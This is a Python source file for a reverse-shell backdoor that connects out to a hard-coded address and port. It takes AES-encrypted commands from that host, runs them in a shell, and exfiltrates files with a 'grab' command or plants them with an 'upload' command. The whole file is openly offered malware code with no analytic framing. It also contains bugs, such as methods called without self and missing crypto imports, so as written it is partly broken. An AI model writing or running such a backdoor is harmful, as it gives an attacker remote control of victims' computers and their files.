import socket, subprocess, os

def main():
    backdoor = Backdoor('192.168.159.132', 8080)
    backdoor.start()

class Backdoor:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.IV = b"H" * 16
        self.key = b"H" * 32


    def start(self):
        self.connect()
        self.commander()

    def connect(self):
        self.sock = socket.socket()
        self.sock.connect((self.ip, self.port))
        return

    def commander(self):
        while True:
            command = recieve_and_decrypt(self.sock)
            
            if 'kill' in command.decode():
                self.sock.close()
                return
            
            if 'grab' in command.decode():
                grab, path = command.decode().split('*')
                try:
                    self.transfer(self.sock, path)
                    continue
                except:
                    send_encrypted(self.sock, 'Error transferring file'.encode())
                    continue

            if 'upload' in command.decode():
                self.download(self.sock, command.decode())
                continue
            
            if command.decode().startswith('cd '):
                try:
                    os.chdir(command[3:])
                    send_encrypted(self.sock, b'Changed directory')
                    continue
                except Exception as e:
                    send_encrypted(self.sock, str(e).encode())
                    continue

            
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE,\
                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            send_encrypted(self.sock, CMD.stdout.read())
            send_encrypted(self.sock, CMD.stderr.read())

    def transfer(self, socket, path):
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            while len(packet) > 0:
                send_encrypted(socket, packet)
                packet = f.read(1024)
            send_encrypted(socket, 'DONE'.encode())
        else:
            send_encrypted(socket, 'File not found.'.encode())
        return

    def download(self, conn, command):
        upload, path = command.split('*')
        f = open(rf'C:\Users\IEUser\AppData\Local\Temp\{path}', 'wb') 
        while True:
            bits = recieve_and_decrypt(conn)
            if bits.endswith('DONE'.encode()):
                f.write(bits[:-4])
                f.close()
                break
            f.write(bits)
        return

    def encrypt(self, message):
        encryptor = AES.new(self.key, AES.MODE_CBC, self.IV)
        padded_message = Padding.pad(message, 16)
        encrypted_message = encryptor.encrypt(padded_message)
        return encrypted_message

    def decrypt(self, cipher):
        decryptor = AES.new(self.key, AES.MODE_CBC, self.IV)
        decrypted_padded_message = decryptor.decrypt(cipher)
        decrypted_message = Padding.unpad(decrypted_padded_message, 16)
        return decrypted_message

    def send_encrypted(self, conn, message):
        enc_mess = self.encrypt(message)
        conn.send(enc_mess)

    def recieve_and_decrypt(self, conn):
        message = conn.recv(1024)
        decr_mess = self.decrypt(message)
        return decr_mess



if __name__ == '__main__':
    main()